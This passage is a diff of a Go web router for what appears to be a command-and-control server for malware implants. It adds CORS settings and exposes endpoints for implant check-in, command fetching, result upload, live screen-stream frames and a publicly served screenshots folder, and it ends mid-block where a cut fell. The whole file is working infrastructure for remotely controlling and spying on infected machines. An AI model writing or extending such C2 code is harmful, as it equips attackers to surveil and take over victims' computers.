@@ -1,38 +1,44 @@
-// Package routes awesomeProject/routes/routes.go
+// Package routes 
 package routes
 
 import (
 	"awesomeProject/controllers"
 	"awesomeProject/middleware"
+	"path/filepath" 
+	"time"
+
+	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
-	"path/filepath" // NEW IMPORT
 )
 
 func SetupRouter() *gin.Engine {
 	r := gin.Default()
 
-	// --- Serve Static Screenshot Files ---
-	// This route should ideally be more secure in a production environment
-	// (e.g., using signed URLs or a short-lived token in the query param
-	// that the main app can generate)
-	// For now, it's open but relies on the obscurity of implant_token and filename.
-	// The path "c2_screenshots" should match where `saveScreenshotToFile` saves files.
+	// Add CORS middleware
+	r.Use(cors.New(cors.Config{
+		AllowOrigins:     []string{"http://localhost:3000", "http://127.0.0.1:3000"},
+		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
+		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
+		ExposeHeaders:    []string{"Content-Length"},
+		AllowCredentials: true,
+		MaxAge:           12 * time.Hour,
+	}))
+
+	
 	absScreenshotPath, _ := filepath.Abs("./c2_screenshots") // Get absolute path
 	r.StaticFS("/c2_screenshots", gin.Dir(absScreenshotPath, false))
-	// Example URL: /screenshots/implant-token-guid/screenshot_cmd123_timestamp.png
-	// IMPORTANT: Ensure the `c2_screenshots` directory exists at the root of your C2 server executable.
 
 	// Public routes for implant communication
 	r.POST("/checkin", controllers.CheckinImplant)
 	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands)
 	r.POST("/command-result", controllers.HandleCommandResult)
-	r.POST("/livestream-frame", controllers.HandleLivestreamFrame) // <-- ADD THIS LINE
+	r.POST("/livestream-frame", controllers.HandleLivestreamFrame) 
 
 	// Public routes for user auth
 	r.POST("/register", controllers.Register)
 	r.POST("/login", controllers.Login)
 
-	// Protected routes (for Dashboard UI)
+	// Protected routes 
 	protected := r.Group("/api")
 	protected.Use(middleware.AuthMiddleware())
 	{
